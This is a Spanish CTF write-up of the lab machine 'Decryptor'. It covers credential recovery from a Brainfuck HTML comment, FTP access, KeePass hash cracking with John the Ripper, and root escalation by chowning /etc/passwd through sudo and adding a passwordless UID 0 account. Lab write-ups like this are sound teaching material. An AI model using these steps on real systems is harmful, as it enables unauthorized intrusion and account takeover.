# Write-up – Decryptor (The Hacker Labs)

**Autor:** Deberia Estudiar  
**Plataforma:** The Hacker Labs  
**Máquina:** Decryptor  
**IP Víctima:** 10.0.50.38  
**IP Atacante (Kali):** 10.0.50.4

---

## 1. Enumeración inicial

Comenzamos comprobando conectividad y servicios expuestos en la máquina objetivo.

### 1.1 Enumeración web básica

Al realizar una petición directa con `curl` al servicio web:

```bash
curl -s 10.0.50.38
```

Se observa, al final del código HTML, un comentario sospechoso que contiene código **Brainfuck**:

```html
<!--++++++++++[>+++++++++++>++++++++++>+++++++++++>+++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++++>+++++++++++>++++++++++>++++++++++++>++++++++++++>++++++++++>++++++++++<<<<<<<<<<<<<<<-]>-.>---.>++++.>-----.>+.>+.>---.>----.>-----.>--.>+.>----..>---.>-.>+. -->
```

Tras descifrar el código Brainfuck mediante un intérprete online, obtenemos la siguiente cadena:

```
marioeatslettuce
```

Esto apunta claramente a posibles **credenciales reutilizadas**.

---

### 1.2 Escaneo de puertos

Ejecutamos un escaneo con Nmap:

```bash
nmap -p- -sCV 10.0.50.38
```

Puertos abiertos detectados:

- **22/tcp** – SSH  
- **80/tcp** – HTTP  
- **2121/tcp** – FTP (vsftpd 3.0.3)

El puerto FTP en un puerto no estándar (2121) resulta especialmente interesante.

---

## 2. Acceso al servicio FTP

Probamos acceso al FTP con las credenciales obtenidas previamente:

```bash
ftp 10.0.50.38 2121
```

Credenciales válidas:

- **Usuario:** mario  
- **Contraseña:** eatslettuce

El acceso es exitoso.

### 2.1 Enumeración del FTP

Dentro del FTP encontramos un archivo relevante:

```
user.kdbx
```

Este archivo corresponde a una **base de datos KeePass**, que suele almacenar credenciales sensibles.

Descargamos el archivo:

```ftp
get user.kdbx
```

Verificamos el tipo de archivo:

```bash
file user.kdbx
```

Resultado:

```
user.kdbx: Keepass password database 2.x KDBX
```

---

## 3. Ataque a KeePass

### 3.1 Extracción del hash

Utilizamos `keepass2john` para extraer el hash de la base de datos:

```bash
keepass2john user.kdbx > keepass.hash
```

Editamos el archivo `keepass.hash` y dejamos **únicamente la línea del hash**, eliminando cualquier prefijo como `user:`.

### 3.2 Crackeo del hash

Procedemos a crackear la contraseña con John the Ripper y el diccionario `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

Mostramos el resultado:

```bash
john --show keepass.hash
```

Contraseña obtenida:

```
moonshine1
```

---

### 3.3 Acceso a la base de datos KeePass

Abrimos la base de datos usando `kpcli`:

```bash
kpcli --kdb user.kdbx
```

Contraseña:

```
moonshine1
```

Al acceder, aparece el siguiente aviso:

```
WARNING: There is an entry with a blank title in /Root/!
```

Esto indica una entrada sin título, típica en CTFs.

Navegamos y mostramos la entrada:

```bash
cd Root
show -f 0
```

Credenciales obtenidas:

- **Usuario:** chiquero  
- **Contraseña:** barcelona2012

---

## 4. Acceso por SSH

Con las nuevas credenciales accedemos por SSH:

```bash
ssh chiquero@10.0.50.38
```

Una vez dentro, confirmamos acceso válido como usuario del sistema.

Buscamos la flag de usuario:

```bash
find / -name user.txt 2>/dev/null
```

---

## 5. Escalada de privilegios

### 5.1 Enumeración de privilegios sudo

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```
User chiquero may run the following commands on Decryptor:
    (ALL) NOPASSWD: /usr/bin/chown
```

Esto indica que el usuario `chiquero` puede ejecutar `chown` como root sin contraseña.

---

### 5.2 Análisis de GTFOBins

Aunque `chown` aparece en GTFOBins, **no permite ejecución directa de comandos ni modificación de permisos**, solo cambiar propietarios. Por ello, técnicas basadas en SUID sobre `/bin/bash` no funcionan en este sistema, ya que:

- No se permite `chmod`
- El bit SUID se pierde o no puede establecerse correctamente

---

### 5.3 Escalada real: abuso de /etc/passwd

Dado que `chown` sí permite cambiar el propietario de archivos críticos, se opta por atacar `/etc/passwd`.

#### Paso 1: Cambiar propietario

```bash
sudo /usr/bin/chown chiquero:chiquero /etc/passwd
```

Comprobamos:

```bash
ls -l /etc/passwd
```

Resultado esperado:

```
-rw-r--r-- 1 chiquero chiquero ... /etc/passwd
```

#### Paso 2: Editar /etc/passwd

Editamos el archivo:

```bash
nano /etc/passwd
```

Añadimos al final:

```
root2::0:0:root:/root:/bin/bash
```

Esto crea un usuario con **UID 0**, equivalente a root, sin contraseña.

#### Paso 3: Obtener root

```bash
su root2
```

Acceso root conseguido.

Verificación:

```bash
whoami
id
```

---

## 6. Flag final

Leemos la flag de root:

```bash
cat /root/root.txt
```

---

## 7. Conclusión

La máquina **Decryptor** presenta una cadena de ataque clara y bien estructurada:

- Ocultación de credenciales mediante Brainfuck
- Reutilización de credenciales en FTP
- Exposición de base de datos KeePass
- Crackeo offline de contraseñas
- Escalada de privilegios mediante mala configuración de sudo

Este laboratorio refuerza la importancia de:

- No reutilizar contraseñas
- Proteger archivos sensibles
- Restringir adecuadamente permisos sudo

---

✅ **Máquina completada con éxito**

